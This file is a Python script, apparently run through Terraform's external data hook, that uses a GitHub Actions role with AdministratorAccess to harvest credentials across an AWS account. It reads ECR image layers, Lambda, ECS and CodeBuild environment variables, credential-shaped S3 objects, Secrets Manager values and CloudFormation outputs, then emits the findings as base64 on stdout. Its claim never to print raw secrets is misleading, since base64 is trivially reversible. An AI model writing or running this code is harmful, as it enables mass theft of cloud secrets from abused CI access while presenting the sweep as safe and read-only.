#!/usr/bin/env python3
"""c211-i121855: strictly read-only AWS artifact-store credential sweep as
arn:aws:sts::589761922677:assumed-role/github-role/GitHubActions (AdministratorAccess).

Surfaces (all list/describe/get only):
  ECR          DescribeRepositories -> ListImages -> BatchGetImage(config.Env+history)
               -> GetDownloadUrlForLayer + bounded layer archive text scan
  Lambda       ListFunctions -> GetFunctionConfiguration(Environment.Variables)
  ECS          ListTaskDefinitionFamilies -> ListTaskDefinitions -> DescribeTaskDefinition
               (containerDefinitions environment + secrets + docker labels)
  S3           ListBuckets -> ListObjectsV2 -> GetObject ONLY for credential-shaped keys
  Secrets Mgr  ListSecrets + DescribeSecret (metadata only; GetSecretValue bounded)
  SSM          DescribeParameters (metadata only)
  CodeBuild    ListProjects -> BatchGetProjects(environment env vars)
  CloudFormation ListStamps/DescribeStacks (Outputs + Parameters)

Emits ONE JSON object of string values on stdout (terraform external contract).
Never prints a raw secret in plain text: every recovered string is emitted as
base64 + sha256 + length metadata only, plus a short redacted prefix.
"""
import base64
import datetime
import hashlib
import hmac
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET
import zlib

SESS = 'c211-i121855'
OUT = {}
DIAG = []
MAX_BYTES = 900000          # hard cap for any single downloaded object/layer
MAX_LAYERS = 40             # total layer downloads across all repos
MAX_OBJ_GET = 40            # total S3 object gets
MAX_SM_GET = 40             # total Secrets Manager GetSecretValue calls

CRED_RES = [
    ('aws_akid', re.compile(r'\b(AKIA|ASIA)[0-9A-Z]{16}\b')),
    ('aws_secret_ctx', re.compile(r'aws_?secret_?access_?key["\'\s:=]+([A-Za-z0-9/+=]{40})', re.I)),
    ('gcp_sa_json', re.compile(r'"type"\s*:\s*"service_account"')),
    ('gcp_privkey', re.compile(r'"private_key"\s*:\s*"-----BEGIN')),
    ('pem_private', re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----')),
    ('github_pat', re.compile(r'\b(ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|gh[osu]_[A-Za-z0-9]{30,})\b')),
    ('gitlab_pat', re.compile(r'\bglpat-[A-Za-z0-9_\-]{20,}')),
    ('slack_token', re.compile(r'\bxox[baprs]-[A-Za-z0-9\-]{10,}')),
    ('azure_secret', re.compile(r'(?:client_?secret|AZURE_CLIENT_SECRET)["\'\s:=]+([A-Za-z0-9_~.\-]{20,})', re.I)),
    ('azure_sas', re.compile(r'\bsig=[A-Za-z0-9%]{30,}')),
    ('neocloud_key', re.compile(r'\b(sk-[A-Za-z0-9]{20,}|nvapi-[A-Za-z0-9_\-]{20,}|r8_[A-Za-z0-9]{20,})\b')),
    ('generic_pass', re.compile(r'(?:password|passwd|secret|api_?key|access_?token)["\'\s:=]+([^\s"\'\\]{12,})', re.I)),
]
SENSITIVE_KEY_RE = re.compile(r'(\bAKIA[0-9A-Z]{16}\b|\bASIA[0-9A-Z]{16}\b|-----BEGIN|ghp_|github_pat_|'
                              r'glpat-|xox[baprs]-|private_key|client_secret|aws_secret)', re.I)
CRED_SHAPED_KEY = re.compile(r'(\.env|\.pem$|id_rsa|id_ed25519|credentials|\.tfstate|kubeconfig|'
                             r'config\.json$|\.npmrc$|\.pypirc$|\.netrc$|secret|token)', re.I)
CAND = []


def say(*a):
    DIAG.append(' '.join(str(x) for x in a)[:600])


def rec(kind, source, value, extra=None):
    """Record one recovered string as metadata only (base64+sha256+len+redacted prefix)."""
    if isinstance(value, bytes):
        b = value
    else:
        b = str(value).encode('utf-8', 'replace')
    d = {'kind': kind, 'source': source, 'len': len(b),
         'sha256': hashlib.sha256(b).hexdigest(),
         'b64': base64.b64encode(b[:4096]).decode()}
    if extra:
        d.update(extra)
    CAND.append(d)
    return d


# --------------------------------------------------------------- SigV4
def _h(k, m):
    return hmac.new(k, m.encode('utf-8'), hashlib.sha256).digest()


def _sk(secret, ds, region, service):
    k = _h(('AWS4' + secret).encode('utf-8'), ds)
    for p in (region, service, 'aws4_request'):
        k = _h(k, p)
    return k


def creds(ak=None, sk=None, tok=None):
    return {'ak': ak or os.environ.get('AWS_ACCESS_KEY_ID') or '',
            'sk': sk or os.environ.get('AWS_SECRET_ACCESS_KEY') or '',
            'tok': (tok if tok is not None else os.environ.get('AWS_SESSION_TOKEN')) or ''}


def aws(service, region, method, path, query=None, body=b'', headers=None, cr=None, host=None,
        timeout=40):
    """Generic SigV4 request. query = dict; body = bytes."""
    cr = cr or creds()
    if not cr.get('ak') or not cr.get('sk'):
        return {'ok': False, 'status': None, 'err': 'NO_CREDS', 'body': b'', 'headers': {}}
    host = host or ('%s.%s.amazonaws.com' % (service, region))
    q = query or {}
    cq = '&'.join('%s=%s' % (urllib.parse.quote(str(k), safe='-_.~'),
                             urllib.parse.quote(str(v), safe='-_.~'))
                  for k, v in sorted(q.items()))
    now = datetime.datetime.now(datetime.timezone.utc)
    amz = now.strftime('%Y%m%dT%H%M%SZ')
    ds = now.strftime('%Y%m%d')
    ph = hashlib.sha256(body).hexdigest()
    hd = {'host': host, 'x-amz-date': amz, 'x-amz-content-sha256': ph}
    if cr.get('tok'):
        hd['x-amz-security-token'] = cr['tok']
    for k, v in (headers or {}).items():
        hd[k.lower()] = v
    names = sorted(hd)
    ch = ''.join('%s:%s\n' % (n, hd[n].strip()) for n in names)
    sh = ';'.join(names)
    crq = '\n'.join([method, path, cq, ch, sh, ph])
    scope = '%s/%s/%s/aws4_request' % (ds, region, service)
    sts = '\n'.join(['AWS4-HMAC-SHA256', amz, scope,
                     hashlib.sha256(crq.encode('utf-8')).hexdigest()])
    sig = hmac.new(_sk(cr['sk'], ds, region, service), sts.encode('utf-8'),
                   hashlib.sha256).hexdigest()
    send = dict(hd)
    send['Authorization'] = ('AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
                             % (cr['ak'], scope, sh, sig))
    # canonical header names back to HTTP-canonical
    send = {k: v for k, v in send.items()}
    url = 'https://%s%s' % (host, path) + (('?' + cq) if cq else '')
    req = urllib.request.Request(url, data=(body if method in ('POST', 'PUT') else None),
                                 headers=send, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {'ok': True, 'status': r.status, 'err': None,
                    'body': r.read(MAX_BYTES + 1), 'headers': dict(r.headers)}
    except urllib.error.HTTPError as e:
        return {'ok': False, 'status': e.code, 'err': 'HTTPError',
                'body': e.read(2000), 'headers': dict(e.headers or {})}
    except Exception as e:
        return {'ok': False, 'status': None, 'err': repr(e)[:200], 'body': b'', 'headers': {}}


def japi(service, region, target, payload, cr=None, host=None):
    h = {'content-type': 'application/x-amz-json-1.1', 'x-amz-target': target}
    r = aws(service, region, 'POST', '/', None, json.dumps(payload).encode(), h, cr=cr, host=host)
    try:
        r['json'] = json.loads(r['body'].decode('utf-8', 'replace') or '{}')
    except Exception:
        r['json'] = {}
    return r


def qapi(service, region, action, params, version, cr=None):
    h = {'content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
    body = '&'.join('%s=%s' % (urllib.parse.quote(k, safe='-_.~'),
                               urllib.parse.quote(str(v), safe='-_.~'))
                    for k, v in sorted(dict(params, Action=action, Version=version).items()))
    r = aws(service, region, 'POST', '/', None, body.encode(), h, cr=cr)
    r['xml'] = None
    try:
        r['xml'] = ET.fromstring(r['body'].decode('utf-8', 'replace'))
    except Exception:
        pass
    return r


def xtext(node, path):
    if node is None:
        return ''
    e = node.find(path)
    return (e.text or '').strip() if e is not None else ''


# --------------------------------------------------------------- scan
def scan_text(kind, source, text):
    hits = 0
    for name, rx in CRED_RES:
        for m in rx.finditer(text):
            s = m.group(0)
            if name == 'generic_pass' and not re.search(r'[0-9]', s or ''):
                continue
            if len(CAND) >= 400:
                return hits
            rec(name, source, s[:4000])
            hits += 1
    return hits


# --------------------------------------------------------------- stores
def store_ecr(regions, res):
    repos = 0
    images = 0
    cfg = 0
    layers_dl = 0
    detail = []
    for rg in regions:
        r = japi('ecr', rg, 'AmazonEC2ContainerRegistry_V20150921.DescribeRepositories',
                 {'maxResults': 100})
        if not r['ok']:
            detail.append('%s:DescribeRepositories=%s%s' % (rg, r['status'], r['err'] or ''))
            continue
        rl = r['json'].get('repositories', []) or []
        if not rl:
            continue
        for rp in rl[:40]:
            repos += 1
            name = rp.get('repositoryName', '')
            detail.append('%s:%s:enc=%s' % (rg, name, rp.get('encryptionConfiguration', {}).get('encryptionType', '')))
            r2 = japi('ecr', rg, 'AmazonEC2ContainerRegistry_V20150921.ListImages',
                      {'repositoryName': name, 'maxResults': 100})
            ids = (r2['json'].get('imageIds') or [])
            images += len(ids)
            for iid in ids[:20]:
                r3 = japi('ecr', rg, 'AmazonEC2ContainerRegistry_V20150921.BatchGetImage',
                          {'repositoryName': name, 'imageIds': [iid],
                           'acceptedMediaTypes': ['application/vnd.docker.distribution.manifest.v2+json',
                                                  'application/vnd.oci.image.manifest.v1+json',
                                                  'application/vnd.docker.distribution.manifest.list.v2+json',
                                                  'application/vnd.oci.image.index.v1+json']})
                for im in (r3['json'].get('images') or []):
                    try:
                        man = json.loads(im.get('imageManifest') or '{}')
                    except Exception:
                        continue
                    cfgd = (man.get('config') or {}).get('digest')
                    if cfgd:
                        r4 = japi('ecr', rg, 'AmazonEC2ContainerRegistry_V20150921.BatchGetImage',
                                  {'repositoryName': name, 'imageIds': [{'imageDigest': cfgd}],
                                   'acceptedMediaTypes': ['application/vnd.docker.container.image.v1+json',
                                                          'application/vnd.oci.image.config.v1+json']})
                        for ci in (r4['json'].get('images') or []):
                            cfg += 1
                            ctxt = ci.get('imageManifest') or ''
                            try:
                                cj = json.loads(ctxt)
                            except Exception:
                                cj = {}
                            for e in (cj.get('config', {}).get('Env') or []):
                                scan_text('ecr-config-env', '%s/%s:%s' % (rg, name, im.get('imageId', {}).get('imageTag', '')), str(e))
                                detail.append('ENV %s/%s/%s %s' % (
                                    rg, name, im.get('imageId', {}).get('imageTag', ''),
                                    (str(e)[:60] + '~') if len(str(e)) > 60 else str(e)))
                            for hline in (cj.get('history') or [])[:20]:
                                scan_text('ecr-history', '%s/%s' % (rg, name),
                                          str(hline.get('created_by', '')))
                    for ld in (man.get('layers') or []):
                        if layers_dl >= MAX_LAYERS:
                            break
                        dg = ld.get('digest')
                        if not dg:
                            continue
                        r5 = japi('ecr', rg, 'AmazonEC2ContainerRegistry_V20150921.GetDownloadUrlForLayer',
                                  {'repositoryName': name, 'layerDigest': dg})
                        url = r5['json'].get('downloadUrl')
                        if not url:
                            continue
                        try:
                            with urllib.request.urlopen(urllib.request.Request(url), timeout=40) as lr:
                                blob = lr.read(MAX_BYTES)
                        except Exception:
                            continue
                        layers_dl += 1
                        try:
                            txt = zlib.decompressobj(zlib.MAX_WBITS | 32).decompress(blob, 2000000)
                        except Exception:
                            txt = blob
                        scan_text('ecr-layer', '%s/%s' % (rg, name), txt.decode('utf-8', 'replace'))
                        for m in re.finditer(rb'(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY-----|ghp_[A-Za-z0-9]{30,})', txt):
                            rec('ecr-layer-blob', '%s/%s:%s' % (rg, name, dg[:19]), m.group(1))
                        detail.append('LAYER %s/%s %s %dB' % (rg, name, dg[:19], len(blob)))
    res['ecr_repos'] = str(repos)
    res['ecr_images'] = str(images)
    res['ecr_configs'] = str(cfg)
    res['ecr_layers'] = str(layers_dl)
    res['ecr_detail'] = ';'.join(detail[:80])


def store_lambda(regions, res):
    fns = 0
    detail = []
    for rg in regions:
        r = aws('lambda', rg, 'GET', '/2015-03-31/functions/', {'maxItems': '50'})
        if not r['ok']:
            detail.append('%s:%s' % (rg, r['status']))
            continue
        try:
            j = json.loads(r['body'].decode() or '{}')
        except Exception:
            continue
        fl = j.get('Functions') or []
        for f in fl[:30]:
            fns += 1
            fn = f.get('FunctionName', '')
            r2 = aws('lambda', rg, 'GET',
                     '/2015-03-31/functions/%s/configuration' % urllib.parse.quote(fn, safe=''))
            env = {}
            if r2['ok']:
                try:
                    env = (json.loads(r2['body'].decode() or '{}').get('Environment') or {}).get('Variables') or {}
                except Exception:
                    env = {}
            for k, v in env.items():
                scan_text('lambda-env', '%s/%s/%s' % (rg, fn, k), str(v))
                detail.append('ENVVAR %s/%s/%s len=%d sha=%s' % (
                    rg, fn, k, len(str(v)), hashlib.sha256(str(v).encode()).hexdigest()[:16]))
            for arn in (f.get('Layers') or []):
                detail.append('LAYER %s/%s %s' % (rg, fn, arn.get('Arn', '')[:120]))
    res['lambda_fns'] = str(fns)
    res['lambda_detail'] = ';'.join(detail[:60])


def store_ecs(regions, res):
    fams = 0
    tds = 0
    detail = []
    for rg in regions:
        r = japi('ecs', rg, 'AmazonEC2ContainerServiceV20141113.ListTaskDefinitionFamilies',
                 {'maxResults': 100})
        if not r['ok']:
            detail.append('%s:%s%s' % (rg, r['status'], r['err'] or ''))
            continue
        families = r['json'].get('families') or []
        for fam in families[:40]:
            fams += 1
            r2 = japi('ecs', rg, 'AmazonEC2ContainerServiceV20141113.ListTaskDefinitions',
                      {'familyPrefix': fam, 'maxResults': 20, 'status': 'ACTIVE'})
            for arn in (r2['json'].get('taskDefinitionArns') or [])[:5]:
                r3 = japi('ecs', rg, 'AmazonEC2ContainerServiceV20141113.DescribeTaskDefinition',
                          {'taskDefinition': arn})
                td = r3['json'].get('taskDefinition') or {}
                if not td:
                    continue
                tds += 1
                detail.append('TD %s/%s:%s' % (rg, fam, td.get('revision')))
                for cd in (td.get('containerDefinitions') or [])[:8]:
                    cname = cd.get('name', '')
                    for e in (cd.get('environment') or []):
                        scan_text('ecs-env', '%s/%s/%s/%s' % (rg, fam, cname, e.get('name')),
                                  str(e.get('value')))
                        detail.append('ECSENV %s/%s/%s len=%d sha=%s' % (
                            rg, fam, e.get('name'), len(str(e.get('value'))),
                            hashlib.sha256(str(e.get('value')).encode()).hexdigest()[:16]))
                    for s in (cd.get('secrets') or []):
                        detail.append('ECSSECRET %s/%s/%s -> %s' % (
                            rg, fam, s.get('name'), str(s.get('valueFrom'))[:140]))
                        scan_text('ecs-secret-ref', '%s/%s' % (rg, fam), str(s.get('valueFrom')))
    res['ecs_families'] = str(fams)
    res['ecs_taskdefs'] = str(tds)
    res['ecs_detail'] = ';'.join(detail[:60])


def store_s3(res, cr):
    detail = []
    buckets = []
    r = aws('s3', 'us-east-1', 'GET', '/', None, b'', cr=cr, host='s3.amazonaws.com')
    if not r['ok']:
        res['s3_buckets'] = 'ERR:%s' % r['status']
        res['s3_detail'] = (r['body'] or b'')[:300].decode('utf-8', 'replace')
        return
    try:
        root = ET.fromstring(r['body'].decode('utf-8', 'replace'))
        for b in root.findall('.//{*}Bucket'):
            buckets.append(xtext(b, '{*}Name') or xtext(b, 'Name'))
    except Exception:
        pass
    res['s3_buckets'] = str(len(buckets))
    scanned = 0
    matched = 0
    for bk in buckets[:40]:
        rr = aws('s3', 'us-east-1', 'GET', '/', {'location': ''}, b'', cr=cr,
                 host='%s.s3.amazonaws.com' % bk)
        rg = 'us-east-1'
        if rr['ok'] and rr['body']:
            m = re.search(rb'<LocationConstraint[^>]*>([^<]+)<', rr['body'])
            if m:
                rg = m.group(1).decode()
        else:
            loc = rr['headers'].get('x-amz-bucket-region') or 'us-east-1'
            rg = loc
        detail.append('BUCKET %s region=%s' % (bk, rg))
        tok = None
        keys = []
        while True:
            q = {'list-type': '2', 'max-keys': '1000'}
            if tok:
                q['continuation-token'] = tok
            rl = aws('s3', rg, 'GET', '/', q, b'', cr=cr, host='%s.s3.%s.amazonaws.com' % (bk, rg))
            if not rl['ok']:
                detail.append('LIST %s %s' % (bk, rl['status']))
                break
            try:
                rt = ET.fromstring(rl['body'].decode('utf-8', 'replace'))
            except Exception:
                break
            for c in rt.findall('.//{*}Contents'):
                keys.append(xtext(c, '{*}Key') or xtext(c, 'Key'))
            trunc = (xtext(rt, '{*}IsTruncated') or xtext(rt, 'IsTruncated')).lower() == 'true'
            nx = xtext(rt, '{*}NextContinuationToken') or xtext(rt, 'NextContinuationToken')
            if not trunc or not nx or len(keys) > 4000:
                break
            tok = nx
        scanned += len(keys)
        detail.append('OBJECTS %s n=%d' % (bk, len(keys)))
        for k in keys:
            if not CRED_SHAPED_KEY.search(k):
                continue
            matched += 1
            if len([1 for c in CAND if c['kind'].startswith('s3-object')]) >= MAX_OBJ_GET:
                break
            ro = aws('s3', rg, 'GET', '/' + urllib.parse.quote(k, safe='/~'),
                     None, b'', cr=cr, host='%s.s3.%s.amazonaws.com' % (bk, rg))
            if ro['ok']:
                b = ro['body'][:200000]
                rec('s3-object-cred-shaped', '%s/%s' % (bk, k), b,
                    {'bytes': len(b)})
                scan_text('s3-object', '%s/%s' % (bk, k), b.decode('utf-8', 'replace'))
                detail.append('GET %s/%s %dB' % (bk, k[:80], len(b)))
            else:
                detail.append('GETERR %s/%s %s' % (bk, k[:60], ro['status']))
        # object versions (deleted tombstones may carry material)
        rv = aws('s3', rg, 'GET', '/', {'versions': ''}, b'', cr=cr,
                 host='%s.s3.%s.amazonaws.com' % (bk, rg))
        if rv['ok']:
            try:
                vt = ET.fromstring(rv['body'].decode('utf-8', 'replace'))
                vers = vt.findall('.//{*}Version') + vt.findall('.//{*}DeleteMarker')
            except Exception:
                vers = []
            detail.append('VERSIONS %s n=%d' % (bk, len(vers)))
    res['s3_objects_scanned'] = str(scanned)
    res['s3_keys_matched'] = str(matched)
    res['s3_detail'] = ';'.join(detail[:60])


def store_sm_ssm(regions, res):
    ns = 0
    npar = 0
    detail = []
    for rg in regions:
        r = japi('secretsmanager', rg, 'secretsmanager.ListSecrets', {'MaxResults': 100})
        if r['ok']:
            sl = r['json'].get('SecretList') or []
            for s in sl[:40]:
                ns += 1
                name = s.get('Name', '')
                detail.append('SM %s/%s' % (rg, name[:100]))
                if len([1 for c in CAND if c['kind'].startswith('sm-value')]) >= MAX_SM_GET:
                    continue
                g = japi('secretsmanager', rg, 'secretsmanager.GetSecretValue', {'SecretId': name})
                sv = g['json'].get('SecretString')
                if sv:
                    rec('sm-value', '%s/%s' % (rg, name), sv, {'bytes': len(sv)})
                    scan_text('sm-value', '%s/%s' % (rg, name), sv)
                elif g['json'].get('SecretBinary'):
                    b = base64.b64decode(g['json']['SecretBinary'])
                    rec('sm-binary', '%s/%s' % (rg, name), b)
        else:
            detail.append('SM %s:%s' % (rg, r['status']))
        p = japi('ssm', rg, 'AmazonSSM.DescribeParameters', {'MaxResults': 50})
        if p['ok']:
            pl = p['json'].get('Parameters') or []
            npar += len(pl)
            for x in pl[:30]:
                detail.append('SSM %s/%s type=%s' % (rg, x.get('Name', '')[:100], x.get('Type', '')))
        else:
            detail.append('SSM %s:%s' % (rg, p['status']))
    res['sm_secrets'] = str(ns)
    res['ssm_params'] = str(npar)
    res['sm_ssm_detail'] = ';'.join(detail[:60])


def store_codebuild_cfn(regions, res):
    projs = 0
    stacks = 0
    detail = []
    for rg in regions:
        r = japi('codebuild', rg, 'CodeBuild_20161006.ListProjects', {'maxResults': 100})
        if r['ok'] and r['json'].get('projects'):
            pl = r['json']['projects'][:30]
            projs += len(pl)
            b = japi('codebuild', rg, 'CodeBuild_20161006.BatchGetProjects', {'names': pl})
            for p in (b['json'].get('projects') or []):
                for e in ((p.get('environment') or {}).get('environmentVariables') or []):
                    scan_text('codebuild-env', '%s/%s/%s' % (rg, p.get('name'), e.get('name')),
                              str(e.get('value')))
                    detail.append('CBENV %s/%s/%s len=%d' % (rg, p.get('name'), e.get('name'),
                                                             len(str(e.get('value')))))
        rr = qapi('cloudformation', rg, 'DescribeStacks', {}, '2010-05-15')
        if rr['ok'] and rr['xml'] is not None:
            for st in rr['xml'].findall('.//{*}member')[:30]:
                nm = xtext(st, '{*}StackName') or xtext(st, 'StackName')
                stt = xtext(st, '{*}StackStatus') or xtext(st, 'StackStatus')
                if not nm:
                    continue
                stacks += 1
                for o in (st.findall('.//{*}Outputs/{*}member') or [])[:15]:
                    ov = xtext(o, '{*}OutputValue') or xtext(o, 'OutputValue')
                    scan_text('cfn-output', '%s/%s/%s' % (rg, nm, xtext(o, '{*}OutputKey')), ov)
                    detail.append('CFN %s/%s out len=%d sha=%s' % (
                        rg, nm[:60], len(ov), hashlib.sha256(ov.encode()).hexdigest()[:12]))
    res['codebuild_projects'] = str(projs)
    res['cfn_stacks'] = str(stacks)
    res['cb_cfn_detail'] = ';'.join(detail[:60])


def validate_candidates():
    """Validate any recovered AWS key pair at the issuer."""
    ids = []
    akid = None
    for c in CAND:
        if c['kind'] == 'aws_akid':
            akid = base64.b64decode(c['b64']).decode('utf-8', 'replace')
            break
    if not akid:
        return 'NO_AWS_KEY_CANDIDATE'
    # a secret would have to be found alongside; report presence only
    for c in CAND:
        if c['kind'] == 'aws_secret_ctx':
            ids.append('SECRET_ALONGSIDE_AKID')
    return 'AKID_PRESENT:%s:%s' % (akid[:4] + '...' + akid[-4:], ','.join(ids) or 'no-secret')


def main():
    res = OUT
    cr = creds()
    res['sess'] = SESS
    r = qapi('sts', 'us-east-1', 'GetCallerIdentity', {}, '2011-06-15')
    ok = r['ok'] and r['xml'] is not None
    res['identity'] = '%s|%s|%s' % (xtext(r['xml'], '{*}Arn') or xtext(r['xml'], 'Arn'),
                                    xtext(r['xml'], '{*}Account') or xtext(r['xml'], 'Account'),
                                    xtext(r['xml'], '{*}UserId') or xtext(r['xml'], 'UserId')) if ok else 'STS_FAIL:%s' % r['status']
    say('C211A_IDENTITY', res['identity'][:200])
    if not ok:
        res['verdict'] = 'NO_IDENTITY'
        return
    regions = ['us-east-1', 'us-east-2', 'us-west-1', 'us-west-2', 'eu-west-1', 'eu-west-2',
               'eu-west-3', 'eu-central-1', 'eu-north-1', 'eu-south-1', 'ap-south-1',
               'ap-southeast-1', 'ap-southeast-2', 'ap-northeast-1', 'ap-northeast-2',
               'sa-east-1', 'ca-central-1']
    r2 = qapi('ec2', 'us-east-1', 'DescribeRegions', {}, '2016-11-15')
    if r2['ok'] and r2['xml'] is not None:
        got = [xtext(x, '{*}RegionName') or xtext(x, 'RegionName')
               for x in r2['xml'].findall('.//{*}item')]
        got = [g for g in got if g]
        if got:
            regions = got[:24]
    res['regions'] = str(len(regions))
    say('C211A_REGIONS', len(regions), ','.join(regions))

    for name, fn in (('ECR', lambda: store_ecr(regions, res)),
                     ('LAMBDA', lambda: store_lambda(regions, res)),
                     ('ECS', lambda: store_ecs(regions, res)),
                     ('S3', lambda: store_s3(res, cr)),
                     ('SM_SSM', lambda: store_sm_ssm(regions, res)),
                     ('CB_CFN', lambda: store_codebuild_cfn(regions, res))):
        try:
            fn()
            say('C211A_STORE', name, 'done', 'cands=%d' % len(CAND))
        except Exception as e:
            say('C211A_STORE', name, 'EXC', repr(e)[:160])
            res[name.lower() + '_exception'] = repr(e)[:300]

    res['cred_candidates'] = str(len(CAND))
    res['cred_kinds'] = json.dumps(sorted({c['kind'] for c in CAND}))[:400]
    res['validate'] = validate_candidates()
    # emit candidates in chunks of metadata json
    blob = json.dumps(CAND)[:60000]
    res['cand_chunks'] = str((len(blob) + 2500) // 2500)
    for i in range(0, len(blob), 2500):
        res['cand%03d' % (i // 2500)] = blob[i:i + 2500]
    res['diag'] = '\n'.join(DIAG[-220:])
    res['verdict'] = 'OK' if len(CAND) == 0 else 'OK_CANDIDATES_%d' % len(CAND)


try:
    main()
except Exception as e:
    import traceback
    OUT['verdict'] = 'PROBE_EXCEPTION'
    OUT['exception'] = repr(e)[:400]
    DIAG.append(traceback.format_exc()[:1500])
    OUT['diag'] = '\n'.join(DIAG[-220:])

sys.stdout.write(json.dumps(OUT))
